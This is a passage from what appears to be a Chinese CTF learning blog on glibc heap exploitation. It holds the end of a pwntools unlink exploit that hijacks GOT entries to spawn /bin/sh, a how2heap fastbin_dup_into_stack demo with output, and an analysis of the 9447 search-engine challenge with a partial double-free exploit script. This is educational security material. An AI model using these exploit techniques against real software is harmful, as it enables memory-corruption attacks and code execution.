class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.send(str(index))</span><br><span class="line"></span><br><span class="line">def update(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">#分配chunk1 chunk2</span><br><span class="line">add(1, &apos;a&apos;*0x10)</span><br><span class="line">add(2, &apos;b&apos;*0x10)</span><br><span class="line">#释放chunk1</span><br><span class="line">delete(1)</span><br><span class="line">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span><br><span class="line">add(3, &apos;c&apos;*0x10)</span><br><span class="line">#这时再释放chunk1，让chunk1重新进入fast bin</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">heap_ptr = 0x6020d0 #堆指针</span><br><span class="line">#准备unlink，在chunk1中伪造chunk</span><br><span class="line">payload = p64(0) + p64(0x21)</span><br><span class="line">payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)</span><br><span class="line">payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_size</span><br><span class="line">add(1, payload)</span><br><span class="line">#此时chunk2的inuse位是0，所以触发unlink</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts = elf.symbols[&apos;puts&apos;]</span><br><span class="line">system_off = libc.symbols[&apos;system&apos;]</span><br><span class="line">atoi_off = libc.symbols[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span><br><span class="line">#将chunk2指针覆盖为atoi_got</span><br><span class="line">#将chunk3指针覆盖为puts_got</span><br><span class="line">#将chunk1指针覆盖为free_got</span><br><span class="line">payload = p64(0) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(1, payload)</span><br><span class="line">#再次向chunk1写入，相当于向free_got写入</span><br><span class="line">#这里将free_got写为puts</span><br><span class="line">update(1, p64(puts))</span><br><span class="line"></span><br><span class="line">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span><br><span class="line">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span><br><span class="line">#由此可计算出libc_base</span><br><span class="line">delete(2)</span><br><span class="line">libc_base = u64(p.recv(6) + &apos;\x00\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节</span><br><span class="line">print &quot;libc_base : %#x&quot; % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">#将free的got表写为system</span><br><span class="line">update(1, p64(system))</span><br><span class="line">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span><br><span class="line">add(2, &apos;/bin/sh\x00&apos;)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.1-fastbin_dup</title>
      <link href="/2018/10/15/introduction-to-pwn2-1-fastbin-dup/"/>
      <url>/2018/10/15/introduction-to-pwn2-1-fastbin-dup/</url>
      <content type="html"><![CDATA[<p><em>尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。</em></p><h1 id="fastbin-dup原理"><a href="#fastbin-dup原理" class="headerlink" title="fastbin_dup原理"></a>fastbin_dup原理</h1><p>利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。<br>产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><p>可以用how2heap的例子来理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ./fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffe1abfa870.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">3rd malloc(8): 0x56317e17e2a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x56317e17e280.</span><br><span class="line">Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">Now the free list has [ 0x56317e17e260 ].</span><br><span class="line">Now, we have access to 0x56317e17e260 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x56317e17e260, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffe1abfa860</span><br></pre></td></tr></table></figure><p>可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。</p><h1 id="例题-9447-search-engine"><a href="#例题-9447-search-engine" class="headerlink" title="例题-9447-search-engine"></a>例题-9447-search-engine</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1: Search with a word&quot;);</span><br><span class="line">  puts(&quot;2: Index a sentence&quot;);</span><br><span class="line">  return puts(&quot;3: Quit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inde a sentence.程序写的很复杂，看起来很揪心。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">int index_a_sentence()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  __int64 v1; // rbp</span><br><span class="line">  int v2; // er13</span><br><span class="line">  char *v3; // r12</span><br><span class="line">  signed __int64 v4; // rbx</span><br><span class="line">  signed __int64 v5; // rbp</span><br><span class="line">  _DWORD *v6; // rax</span><br><span class="line">  int v7; // edx</span><br><span class="line">  __int64 v8; // rdx</span><br><span class="line">  __int64 v10; // rdx</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the sentence size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  v1 = (unsigned int)(v0 - 1);</span><br><span class="line">  v2 = v0;</span><br><span class="line">  if ( (unsigned int)v1 &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the sentence:&quot;);</span><br><span class="line">  v3 = (char *)malloc(v2);</span><br><span class="line">  read_until_newline((__int64)v3, v2, 0);</span><br><span class="line">  v4 = (signed __int64)(v3 + 1);</span><br><span class="line">  v5 = (signed __int64)&amp;v3[v1 + 2];</span><br><span class="line">  v6 = malloc(0x28uLL);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)v6 = v3;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">  v6[6] = v2;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( *(_BYTE *)(v4 - 1) != 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[2] = ++v7;</span><br><span class="line">LABEL_4:</span><br><span class="line">      if ( ++v4 == v5 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)v6;</span><br><span class="line">      *((_QWORD *)v6 + 4) = v10;</span><br><span class="line">      v6 = malloc(0x28uLL);</span><br><span class="line">      v7 = 0;</span><br><span class="line">      *(_QWORD *)v6 = v4;</span><br><span class="line">      v6[2] = 0;</span><br><span class="line">      *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">      v6[6] = v2;</span><br><span class="line">      goto LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v6 = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  if ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)v6;</span><br><span class="line">    *((_QWORD *)v6 + 4) = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Added sentence&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>search word：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void search_with_a_word()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebp</span><br><span class="line">  void *v1; // r12</span><br><span class="line">  __int64 i; // rbx</span><br><span class="line">  char v3; // [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the word size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( (unsigned int)(v0 - 1) &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the word:&quot;);</span><br><span class="line">  v1 = malloc(v0);</span><br><span class="line">  read_until_newline((__int64)v1, v0, 0);</span><br><span class="line">  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( **(_BYTE **)(i + 16) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24));</span><br><span class="line">        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);</span><br><span class="line">        putchar(10);</span><br><span class="line">        puts(&quot;Delete this sentence (y/n)?&quot;);</span><br><span class="line">        read_until_newline((__int64)&amp;v3, 2, 1);</span><br><span class="line">        if ( v3 == 121 )</span><br><span class="line">        &#123;</span><br><span class="line">          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));</span><br><span class="line">          free(*(void **)(i + 16));</span><br><span class="line">          puts(&quot;Deleted!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_num：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 get_num()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  char *endptr; // [rsp+8h] [rbp-50h]</span><br><span class="line">  char nptr; // [rsp+10h] [rbp-48h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+48h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read_until_newline((__int64)&amp;nptr, 48, 1);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, 0);</span><br><span class="line">  if ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, &quot;%s is not a valid number\n&quot;, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(0x28u);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，<br>所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。</p><p>整个过程大概是以一个结构体来保存每个单词：(40个字节)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct words_struct </span><br><span class="line">&#123; </span><br><span class="line">  addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) </span><br><span class="line">  int64_t size; // 单词大小 </span><br><span class="line">  addr* ptr_to_sentences; //单词所在的句子字符串的位置 </span><br><span class="line">  int64_t* size_of_sentences;//句子长度 </span><br><span class="line">  words_struct* next_word;//链表下一个节点指针 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。<br>在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \x00 ，由于单词结构体中存储的单词只是句子的一个指针，<br>所以单词也会被置为 \x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。<br>看起来由于句子内容被置为 \x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，<br>当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。<br>此外，当句子被 memset 的时候，单词虽然都变为了 \x00 ，但是我们仍然可以通过两个 \x00 的比较来绕过 memcmp 的检测。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1) 利用get_num函数的漏洞试图泄露栈地址<br>2) 泄露libc_address，从而计算出system 和 /bin/sh的地址<br>3) 利用fastbin_dup 进行double free<br>4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”)</p><p><em>思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line"></span><br><span class="line">p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)</span><br><span class="line"></span><br><span class="line"># binsh_offset 找不到</span><br><span class="line">pop_rdi_ret = 0x400e23</span><br><span class="line">system_offset = 0x46590</span><br><span class="line">puts_offset = 0x6fd60</span><br><span class="line">binsh_offset = 1558723</span><br><span class="line"></span><br><span class="line">def leak_stack():</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    p.recvuntil(&apos;Quit\n&apos;)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    # doesn&apos;t work all the time</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    leak = p.recvline().split(&apos; &apos;)[0][48:]</span><br><span class="line">    return int(leak[::-1].encode(&apos;hex&apos;), 16)</span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    # this sentence is the same size as a list node</span><br><span class="line">    index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;))</span><br><span class="line"></span><br><span class="line">    # delete the sentence</span><br><span class="line">    search(&apos;a&apos; * 12)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # the node for this sentence gets put in the previous sentence&apos;s spot.</span><br><span class="line">    # note we made sure this doesn&apos;t reuse the chunk that was just freed by</span><br><span class="line">    # making it 64 bytes</span><br><span class="line">    index_sentence(&apos;d&apos; * 64)</span><br><span class="line"></span><br><span class="line">    # free the first sentence again so we can allocate something on top of it.</span><br><span class="line">    # this will work because 1) the sentence no longer starts with a null byte</span><br><span class="line">    # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2)</span><br><span class="line">    # the location where our original string contained `b` is guaranteed to be</span><br><span class="line">    # zero. this is because after the original sentence was zeroed out, nothing</span><br><span class="line">    # was allocated at offset 12, which is just padding in the structure. if</span><br><span class="line">    # we had made the first word in the string 16 bytes instead of 12, then that</span><br><span class="line">    # would put &apos;b&apos; at a location where it would not be guaranteed to be zero.</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # make our fake node</span><br><span class="line">    node = &apos;&apos;</span><br><span class="line">    node += p64(0x400E90) # word pointer &quot;Enter&quot;</span><br><span class="line">    node += p64(5) # word length</span><br><span class="line">    node += p64(0x602028) # sentence pointer (GOT address of free)</span><br><span class="line">    node += p64(64) # length of sentence</span><br><span class="line">    node += p64(0x00000000) # next pointer is null</span><br><span class="line">    assert len(node) == 40</span><br><span class="line"></span><br><span class="line">    # this sentence gets allocated on top of the previous sentence&apos;s node.</span><br><span class="line">    # we can thus control the sentence pointer of that node and leak memory.</span><br><span class="line">    index_sentence(node)</span><br><span class="line"></span><br><span class="line">    # this simply receives all input from the binary and discards it, which</span><br><span class="line">    # makes parsing out the leaked address easier below.</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    # leak the libc address</span><br><span class="line">    search(&apos;Enter&apos;)</span><br><span class="line">    p.recvuntil(&apos;Found 64: &apos;)</span><br><span class="line">    leak = u64(p.recvline()[:8])</span><br><span class="line">    p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary</span><br><span class="line">    return leak</span><br><span class="line"></span><br><span class="line">def index_sentence(s):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    